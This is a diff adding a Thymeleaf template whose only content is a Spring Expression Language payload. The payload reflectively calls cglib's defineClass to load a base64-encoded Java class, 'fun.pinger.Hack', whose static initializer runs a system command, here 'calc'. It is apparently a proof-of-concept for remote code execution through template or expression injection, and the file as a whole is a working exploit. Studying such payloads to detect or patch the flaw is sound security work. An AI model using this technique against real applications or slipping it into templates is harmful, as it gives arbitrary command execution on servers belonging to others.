@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+</head>
+<body>
+
+<tr
+        th:with="defineClassMethod=${T(org.springframework.util.ReflectionUtils).findMethod(T(org.springframework.util.ClassUtils).forName('org.springframework.cglib.core.ReflectUtils',T(org.springframework.util.ClassUtils).getDefaultClassLoader()), 'defineClass', ''.getClass() ,''.getBytes().getClass(), T(org.springframework.util.ClassUtils).forName('java.lang.ClassLoader',T(org.springframework.util.ClassUtils).getDefaultClassLoader()) )}"
+>
+    <td>
+        <a
+                th:with="param2=${T(org.springframework.util.ReflectionUtils).invokeMethod(defineClassMethod, null,
+                    'fun.pinger.Hack',
+                    T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQAKgoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAoBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMSGFjazsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEACUhhY2suamF2YQwACgALBwAiDAAjACQBAARjYWxjDAAlACYBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoAJwEABEhhY2sBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEAD2Z1bi9waW5nZXIvSGFjawEAEUxmdW4vcGluZ2VyL0hhY2s7ACEACAAJAAAAAAACAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAAwAOAAAADAABAAAABQAPACkAAAAIABEACwABAAwAAABmAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAwANAAAAFgAFAAAABwAJAAoADAAIAA0ACQAWAAsADgAAAAwAAQANAAkAEgATAAAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw=='),
+                    new org.springframework.core.OverridingClassLoader(T(org.springframework.util.ClassUtils).getDefaultClassLoader()) )
+                }"
+                th:href="${param2}"
+        ></a>
+    </td>
+</tr>
+
+</body>
+</html>
